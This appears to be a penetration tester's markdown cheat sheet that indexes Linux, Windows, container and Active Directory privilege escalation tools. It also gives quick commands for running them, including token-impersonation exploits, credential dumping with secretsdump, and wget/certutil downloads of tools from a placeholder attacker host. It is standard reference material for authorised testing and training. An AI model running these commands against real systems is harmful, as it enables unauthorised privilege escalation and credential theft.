---
tags: [index, privesc, moc]
---

# Privilege Escalation Tools Index

## Quick Navigation

| Category | Tools | Platform |
|----------|-------|----------|
| Linux Tools | 8 tools | Linux enumeration |
| Windows Tools | 12 tools | Windows enumeration |
| Potato Attacks | 4 tools | Windows token impersonation |
| Container Tools | 2 tools | Docker/container escapes |
| System Packages | 11 tools | Kali repo tools |

## Linux Privilege Escalation

### Enumeration Scripts

- linpeas - Comprehensive Linux enum
- lse - Linux Smart Enumeration (quieter)
- linenum - Classic Linux enumeration
- unix-privesc-check - Perl privesc checker

### Process Monitoring

- pspy - Process snooper (cron jobs)

### Exploit Suggesters

- les - Linux Exploit Suggester (system)
- les2 - Linux Exploit Suggester 2

### Container Tools

- deepce - Docker enumeration

## Windows Privilege Escalation

### Enumeration Scripts

- winpeas - Comprehensive Windows enum
- powerup - PowerShell privesc checks
- jaws - Just Another Windows Enum
- privesccheck - PowerShell privesc checker

### Exploit Suggesters

- sherlock - Windows exploit suggester (pre-10)
- watson - Windows 10/11 exploit suggester
- windows-exploit-suggester - Python exploit suggester

### Compiled Tools

- seatbelt - C# host enumeration
- sharpup - C# privesc checks

### Credential Tools

- mimikatz - Credential dumper
- kerberoast - Kerberos service account attacks

## Potato Attacks (Token Impersonation)

- juicypotato - Classic potato attack
- roguepotato - Modern potato attack
- printspoofer - Print spoofer abuse
- godpotato - .NET 4/3.5 potato

## Container Escapes

- deepce - Docker enumeration
- cdk - Container Dunker Kit

## Kali System Packages

- linux-exploit-suggester - System package
- windows-binaries - Windows binaries collection
- powersploit - PowerShell framework
- nishang - PowerShell offsec framework
- mimikatz - Credential dumper
- kerberoast - Kerberos attacks
- enum4linux-ng - Windows enum
- ldapdomaindump - AD LDAP dumper
- bloodhound - AD visualization
- bloodhound-python - BloodHound collector
- impacket-scripts - Python network protocols

## Quick Reference by Phase

### Linux - Initial Access

./linpeas.sh | tee linpeas.txt
./lse.sh -l 2
./pspy64 -pf -i 1000

### Linux - Finding Exploits

perl /usr/share/linux-exploit-suggester/Linux_Exploit_Suggester.pl
./linux-exploit-suggester-2/linux-exploit-suggester-2.pl

### Windows - Initial Enum

winpeas.exe > winpeas.txt
powershell -ep bypass .\PowerUp.ps1; Invoke-PrivescAudit
.\jaws-enum.ps1

### Windows - Finding Exploits

powershell -ep bypass .\Sherlock.ps1; Find-AllVulns
.\watson.exe
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database database.xlsx --systeminfo systeminfo.txt

### Windows - Token Impersonation

whoami /priv
PrintSpoofer64.exe -i -c cmd.exe
GodPotato-NET4.exe -cmd "cmd /c whoami"

### Container Escapes

./deepce.sh
./cdk evaluate

### AD Attacks

bloodhound-python -d domain.local -u user -p pass -ns dc -c All
impacket-secretsdump domain/user:pass@dc

## Quick Transfer Commands

### Serve Linux Tools

cd ~/tools/privesc/linux && python3 -m http.server 8000
wget http://YOUR_IP:8000/linpeas.sh

### Serve Windows Tools

cd ~/tools/privesc/windows && python3 -m http.server 8000
certutil -urlcache -f http://YOUR_IP:8000/winpeas.exe winpeas.exe

## Notes

- Linux scripts need chmod +x before running
- PowerShell scripts need powershell -ep bypass
- Potato attacks require specific privileges (whoami /priv)
- Always save output for later analysis
